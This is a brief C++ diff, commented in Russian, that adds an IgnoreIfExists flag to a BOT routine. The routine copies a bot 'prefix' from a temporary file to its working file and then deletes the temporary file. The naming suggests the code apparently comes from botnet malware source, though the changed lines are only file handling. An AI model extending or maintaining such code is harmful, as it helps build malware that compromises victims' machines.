@@ -1173,17 +1173,20 @@ void BOT::SavePrefixToTemporaryFile()
 // Функция загружает префикс бота из временного файла
 // сохраняет его в рабочий файл и удаляет временный
 //----------------------------------------------------
-void BOT::SavePrefixFromTemporaryFile()
+void BOT::SavePrefixFromTemporaryFile(bool IgnoreIfExists)
 {
 	string TempName   = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
 	if (File::IsExists(TempName.t_str()))
 	{
 		string PrefixFile = Bot->PrefixFileName();
-		DWORD Size = 0;
-		LPBYTE Prefix = File::ReadToBufferA(TempName.t_str(), Size);
-		if (Prefix && Size)
-			File::WriteBufferA(PrefixFile.t_str(), Prefix, Size);
-		MemFree(Prefix);
+		if (!IgnoreIfExists || !File::IsExists(PrefixFile.t_str()))
+		{
+			DWORD Size = 0;
+			LPBYTE Prefix = File::ReadToBufferA(TempName.t_str(), Size);
+			if (Prefix && Size)
+				File::WriteBufferA(PrefixFile.t_str(), Prefix, Size);
+			MemFree(Prefix);
+        }
 		pDeleteFileA(TempName.t_str());
     }
 }
